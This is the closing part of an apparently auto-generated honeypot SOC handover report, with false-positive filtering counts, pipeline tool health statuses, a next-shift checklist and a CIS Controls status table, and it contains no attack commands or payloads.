| AbuseIPDB score 19 below threshold 25 | 1 |
| AbuseIPDB score 20 below threshold 25 | 1 |
| AbuseIPDB score 4 below threshold 25 | 3 |
| Mass-scanner pattern: no commands, no downloads, ≤2 login attempts | 54 |

> FP threshold: AbuseIPDB score < 25. Known scanner ISPs auto-filtered.

---

## ⚙️ Pipeline Health

| Tool | Role | Status |
|---|---|---|
| Tool 05  | Network Monitor (port 2222) | ✅ HEALTHY |
| Tool 26  | Incident Timeline Generator | ✅ 522 cases |
| Tool 34  | Credential Extractor        | ✅ 259 attempts |
| Tool 35  | SSH Fingerprint Aggregator  | ✅ 18 fingerprints |
| Tool 36  | Command Clustering          | ✅ 10 clusters |
| Tool 27  | Threat Intel Feeder         | ✅ 151 IPs enriched |
| Tool 29  | False Positive Tracker      | ✅ 67 filtered (12.8%) |
| Tool 30  | Metric Exporter             | ✅ stats.json written |
| Tool 30b | ASN Clustering              | ✅ 83 ASNs |
| Tool 31  | Malware Analyzer            | ✅ 49 files |
| Tool 33  | YARA Classifier             | ✅ 27 classified |
| Tool 28  | SOC Handover Report         | ✅ This report (v2.2) |

> **Report grouping:** 219 priority case(s) shown individually · 48 recon entry/entries in table (17 group(s) consolidating 205 session(s)).

---

## 📋 Standing Orders for Next Shift

- [ ] Verify honeypot is HEALTHY (Tool 05 green)
- [ ] Review any new HIGH/CRITICAL priority cases above
- [ ] Check AbuseIPDB for newly reported IPs from this shift
- [ ] If Cowrie captures a download, verify Tool 31 ran and check malware section
- [ ] Integrity baseline auto-recreates every 2 hours via pipeline

---

## 🛡️ CIS Controls Snapshot

| Control | Name | Status | Evidence |
|---|---|---|---|
| CIS-1 | Asset Inventory | ACTIVE | assets.json updated every pipeline run by Tool 05 — covers VM2 directly and VM1 via SSH relay |
| CIS-2 | Software Inventory | MONITORING | data/tool_manifest.json auto-generated from pipeline.yml each run — tracks all active tools, languages, and I/O paths |
| CIS-3 | Data Protection | ACTIVE | R2 archive encrypted at rest — thirha-raw-archive |
| CIS-4 | Secure Configuration | ACTIVE | haproxy.cfg, cowrie.cfg, VCN rules in config/ |
| CIS-5 | Account Management | ACTIVE | Two key pairs, dedicated cowrie user, no shared credentials |
| CIS-6 | Access Control | ACTIVE | Pipeline key vs personal key separation, GitHub Secrets |
| CIS-7 | Vulnerability Management | MONITORING | Oracle security patches — pending regular cadence |
| CIS-8 | Audit Log Management | ACTIVE | cowrie.json + cowrie.log dual streams, 59-day corpus |
| CIS-9 | Email/Web Protection | PLANNED | cloudflared tunnels planned — direct IP exposure currently |
| CIS-10 | Malware Defence | ACTIVE | Tool 31 malware analysis + Tool 33 YARA classification |
| CIS-11 | Data Recovery | ACTIVE | R2 archive, EBS snapshots, runbook recovery procedures |
| CIS-12 | Network Infrastructure | ACTIVE | VCN private networking, HAProxy TCP LB, Cloudflare DNS |

---

_Generated by THIR · Tool 28 v2.3 · SOC Handover Report Generator_  
_Pipeline: `Aegispub/thir-ha · Oracle Cloud HA_  
_Report time: 2026-07-30T06:32:40Z_
